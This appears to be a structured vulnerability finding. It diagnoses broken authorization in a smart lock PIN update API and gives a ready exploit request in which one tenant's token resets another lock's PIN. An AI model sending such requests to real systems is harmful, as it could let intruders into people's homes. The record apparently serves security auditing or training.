diagnosis: The smart lock PIN update endpoint enforces 4-8 numeric characters using class-validator, but relays the new access PIN directly to the MQTT broker command topic for lockId without verifying that the lock belongs to the authenticated user's property or rental unit.
exploit_request:
PUT /api/iot/locks/pin HTTP/1.1
Host: home.security-mesh.io:7003
Authorization: Bearer <tenant_apt_101_jwt>
Content-Type: application/json

{"lockId": "3fa85f64-5717-4562-b3fc-2c963f66afa6", "newPinCode": "1234", "pinLabel": "Maintenance Override"}
